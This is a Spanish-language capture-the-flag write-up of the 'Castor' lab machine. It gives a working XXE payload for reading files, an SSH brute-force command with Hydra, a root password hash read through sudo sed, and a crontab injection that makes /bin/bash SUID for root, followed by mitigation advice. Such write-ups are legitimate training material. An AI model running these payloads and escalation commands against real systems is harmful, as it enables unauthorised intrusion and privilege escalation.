# Informe de Explotación - Máquina "Castor" (The Hacker Labs)
**IP Objetivo:** IP_DE_LA_MAQUINA
**Fecha:** 23 Julio 2026
**Autor:** Kali (opencode)

---

## 1. RESUMEN EJECUTIVO

Se ha comprometido completamente la máquina "Castor" obteniendo acceso root mediante XXE, fuerza bruta SSH y explotación de `sed` con sudo para modificar `/etc/crontab`.

**Vectores de ataque utilizados:**
1. XXE en endpoint XML → Lectura de `/etc/passwd` → Identificación de usuario `castorcin`
2. Fuerza bruta SSH (Hydra) → Acceso como `castorcin`
3. `sed` con sudo NOPASSWD → Escritura en `/etc/crontab` → `chmod u+s /bin/bash`
4. Espera de 60 segundos → `/bin/bash -p` → Root

**Cadena de compromiso:** XXE → castorcin → root

---

## 2. RECONOCIMIENTO INICIAL

### 2.1 Escaneo de puertos (Nmap)
```bash
nmap -sV -p- IP_DE_LA_MAQUINA
```

**Resultado:**
| Puerto | Estado | Servicio | Versión |
|--------|--------|----------|---------|
| 22/tcp | Open | SSH | OpenSSH |
| 80/tcp | HTTP | Apache | Apache httpd |

**Por qué:** Identificar superficie de ataque. Puertos 22 y 80 abiertos.

---

## 3. ENUMERACIÓN WEB

### 3.1 Exploración inicial
Al acceder a `http://IP_DE_LA_MAQUINA` se encontró una página con un endpoint que procesaba XML.

---

## 4. EXPOSICIÓN: XXE EN upload.php

### 4.1 Identificación de la vulnerabilidad
Se descubrió que el servidor procesaba payloads XML con las flags:
```php
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
```

Esto permite **XML External Entity (XXE)** injection.

### 4.2 Payload para lectura de archivos
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
 <name>&xxe;</name>
</root>
```

**Resultado:**
```
root:x:0:0:root:/root:/bin/bash
castorcin:x:1001:1001:castorcin:/home/castorcin:/bin/bash
```

### 4.3 Intentos fallidos
- **/etc/shadow:** `Permission denied` — www-data no tiene permisos
- **expect wrapper:** `Unable to find the wrapper "expect"` — no habilitado

### 4.4 php://filter para lectura
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

**Resultado:** Se obtuvo `/etc/passwd` en base64, confirmando los mismos usuarios.

---

## 5. ACCESO INICIAL

### 5.1 Fuerza bruta SSH (Hydra)
```bash
echo -e "castorcin" > users.txt
hydra -l castorcin -P /usr/share/wordlists/rockyou.txt ssh://IP_DE_LA_MAQUINA
```

**Resultado:**
```
[22][ssh] host: IP_DE_LA_MAQUINA login: castorcin password: [CONTRASEÑA_ENCONTRADA]
```

### 5.2 SSH como castorcin
```bash
ssh castorcin@IP_DE_LA_MAQUINA
```

**Resultado:**
```
castorcin@TheHackersLabs-Castor:~$ whoami
castorcin
```

### 5.3 User Flag
```bash
castorcin@TheHackersLabs-Castor:~$ ls -la
total 28
drwx------ 2 castorcin castorcin 4096 ene 6 2026 .
drwxr-xr-x 3 root root 4096 ene 6 2026 ..
-rw------- 1 castorcin castorcin 154 ene 6 2026 .bash_history
-rw------- 1 castorcin castorcin 220 ene 6 2026 .bash_logout
-rw------- 1 castorcin castorcin 3526 ene 6 2026 .bashrc
-rw------- 1 castorcin castorcin 807 ene 6 2026 .profile
-rw------- 1 root root 36 ene 6 2026 user.txt

castorcin@TheHackersLabs-Castor:~$ cat user.txt
```

---

## 6. ENUMERACIÓN POST-EXPLOTACIÓN

### 6.1 Verificación de sudo
```bash
whoami # castorcin
id # uid=1001(castorcin) gid=1001(castorcin) groups=1001(castorcin)
sudo -l # (ALL : ALL) NOPASSWD: /usr/bin/sed
```

**Análisis CRÍTICO:** `sed` puede ejecutarse como root sin contraseña. Esto permite modificar cualquier archivo del sistema.

---

## 7. ESCALADA A ROOT

### 7.1 Lectura de /etc/shadow con sed
```bash
sudo sed -n '1p' /etc/shadow
```

**Resultado:**
```
root:$y$j9T$Eq7v/abVvURRONvMMttjJ0$C.QUDl5zm8kHf0gWkBlvLDUumvjS1cPZpJLZzilNzQ3:20459:0:99999:7:::
```

**Análisis:** Se obtuvo el hash de root en formato yescrypt (`$y$`). Intentos de cracking con John y Hashcat fallaron — el formato es demasiado nuevo.

### 7.2 Escritura en /etc/crontab con sed
```bash
echo '* * * * * root chmod u+s /bin/bash' | sudo sed -i '1r /dev/stdin' /etc/crontab
```

**Por qué:** `sed -i` puede modificar archivos como root. Se escribió un cronjob que cada minuto ejecuta `chmod u+s /bin/bash`.

### 7.3 Espera y obtención de root
```bash
# Esperar 1 minuto a que el cronjob se ejecute
sleep 60

# Verificar que bash tiene SUID
ls -la /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash

# Obtener root
/bin/bash -p
whoami
# root
```

### 7.4 Root Flag
```bash
bash-5.2# cat /root/root.txt
```

---

## 8. CADENA DE ATAQUE COMPLETA

```
┌─────────────────────────────────────────────────────────────────┐
│ CADENA DE EXPLOTACIÓN │
├─────────────────────────────────────────────────────────────────┤
│ │
│ [1] RECONOCIMIENTO │
│ ┌─ Nmap ──────────────────┐ │
│ │ Puertos: 22(SSH), 80(HTTP) │
│ └─────────────────────────┘ │
│ │ │
│ ▼ │
│ [2] ENUMERACIÓN WEB │
│ ┌─ Endpoint XML ─────────┐ ┌─ XXE LIBXML_NOENT ────────┐ │
│ │ upload.php vulnerable │────▶│ file:///etc/passwd │ │
│ └─────────────────────────┘ │ php://filter para lectura │ │
│ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [3] IDENTIFICACIÓN DE USUARIO │
│ ┌─ /etc/passwd ──────────┐ ┌─ castorcin (uid 1001) ────┐ │
│ │ Shell: /bin/bash │────▶│ Usuario con bash │ │
│ └─────────────────────────┘ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [4] ACCESO INICIAL (SSH) │
│ ┌─ Hydra brute force ────┐ ┌─ castorcin + rockyou.txt ─┐ │
│ │ Fuerza bruta SSH │────▶│ Contraseña encontrada │ │
│ └─────────────────────────┘ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [5] ENUMERACIÓN POST-EXPLOTACIÓN │
│ ┌─ sudo -l ─────────────┐ ┌─ (ALL) NOPASSWD: sed ─────┐ │
│ │ Verificación permisos │────▶│ Escritura como root │ │
│ └─────────────────────────┘ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [6] ESCALADA A ROOT │
│ ┌─ sed -i /etc/crontab ─┐ ┌─ chmod u+s /bin/bash ─────┐ │
│ │ Cronjob como root │────▶│ bash -p → ROOT │ │
│ └─────────────────────────┘ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [7] FLAGS │
│ ┌────────────────────────────────────────────────────────────┐ │
│ │ USER: [castorcin user.txt] │ │
│ │ ROOT: [root.txt] │ │
│ └────────────────────────────────────────────────────────────┘ │
│ │
└─────────────────────────────────────────────────────────────────┘
```

---

## 9. VULNERABILIDADES IDENTIFICADAS

| # | Vulnerabilidad | Severidad | Ubicación | Impacto |
|---|----------------|-----------|-----------|---------|
| 1 | XXE en endpoint XML (LIBXML_NOENT) | CRÍTICA | `upload.php` | Lectura de archivos arbitrarios del servidor |
| 2 | Contraseña débil en SSH | ALTA | SSH de castorcin | Fuerza bruta trivial con rockyou.txt |
| 3 | Sudo NOPASSWD: sed | CRÍTICA | `/etc/sudoers` | Modificación de cualquier archivo como root |
| 4 | Crontab modificable | CRÍTICA | `/etc/crontab` | Escritura de cronjobs maliciosos |
| 5 | Hash yescrypt no crackeable | BAJA | `/etc/shadow` | No fue explotable directamente, pero sed lo evadió |

---

## 10. RECOMENDACIONES DE MITIGACIÓN

1. **Deshabilitar LIBXML_NOENT y LIBXML_DTDLOAD** — Usar `libxml_disable_entity_loader(true)` y parsear sin entidades externas
2. **Implementar contraseñas fuertes** — Usar políticas de complejidad y longitudes mínimas
3. **Eliminar sed de sudoers** — `sed` con `-i` puede modificar archivos arbitrarios; es un vector de escalada trivial
4. **Proteger /etc/crontab** — Restringir permisos de escritura; monitorear cambios
5. **Auditar sudoers regularmente** — Cada comando con NOPASSWD es un riesgo potencial
6. **Implementar least privilege** — castorcin no debería poder ejecutar sed como root
7. **Monitorear ejecución de sudo** — Alertar sobre uso inusual de sed
8. **Usar/AppArmor o SELinux** — Restringir capacidades de procesos web

---

## 11. COMANDOS CLAVE UTILIZADOS

```bash
# Reconocimiento
nmap -sV -p- IP_DE_LA_MAQUINA

# XXE → Lectura de archivos
# Payload XML con file:///etc/passwd
# Payload XML con php://filter/convert.base64-encode/resource=/etc/passwd

# Fuerza bruta SSH
echo -e "castorcin" > users.txt
hydra -l castorcin -P /usr/share/wordlists/rockyou.txt ssh://IP_DE_LA_MAQUINA

# Acceso inicial
ssh castorcin@IP_DE_LA_MAQUINA

# Enumeración
sudo -l

# Escalada: sed lee /etc/shadow
sudo sed -n '1p' /etc/shadow

# Escalada: sed escribe cronjob
echo '* * * * * root chmod u+s /bin/bash' | sudo sed -i '1r /dev/stdin' /etc/crontab

# Espera y obtención de root
sleep 60
ls -la /bin/bash
/bin/bash -p
```

---

## 12. EVIDENCIAS DE COMPROMISO

```
┌────────────────────────────────────────────────────────────┐
│ FLAGS OBTENIDAS │
├────────────────────────────────────────────────────────────┤
│ USER (castorcin): [castorcin user.txt] │
│ ROOT: [root.txt] │
└────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────┐
│ ACCESOS LOGRADOS │
├────────────────────────────────────────────────────────────┤
│ ✓ XXE → Lectura de /etc/passwd │
│ ✓ SSH como castorcin (Hydra brute force) │
│ ✓ Sudo sed → Lectura de /etc/shadow │
│ ✓ Sudo sed → Escritura en /etc/crontab │
│ ✓ Cronjob → chmod u+s /bin/bash → Root │
└────────────────────────────────────────────────────────────┘
```

---

**FIN DEL INFORME**



---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../write-ups/Castor-THL.md|Castor-THL]] — John / Hashcat, Linux, Nmap
- [[Informe_Rockstars.md|Informe_Rockstars]] — Kali Linux, Linux, Nmap
- [[../write-ups/Rockstars-THL.md|Rockstars-THL]] — John / Hashcat, Linux, Nmap
- [[Informe_Banco.md|Informe_Banco]] — Kali Linux, Linux, Nmap
- [[../write-ups/Nike-THL.md|Nike-THL]] — Kali Linux, Linux, Nmap
- [[../apuntes Andres/08.07.2026 Path Traversal, LFI y Escalada - Máquina Banco.md|08.07.2026 Path Traversal, LFI y Escalada - Máquina Banco]] — Kali Linux, Linux, Nmap

### 🛠️ Herramientas

- [[comandos/Hydra|Hydra]]
- [[comandos/John_Hashcat|John / Hashcat]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/05 - Auditoria Web/Path Traversal — 6 Casos y Bypasses.md|Path Traversal / LFI]]
- [[Apuntes/05 - Auditoria Web/XXE — XML External Entity.md|XXE]]

> #hydra #john #kali #lfi #linux #nmap #post-explotacion #redes #ssh #xxe
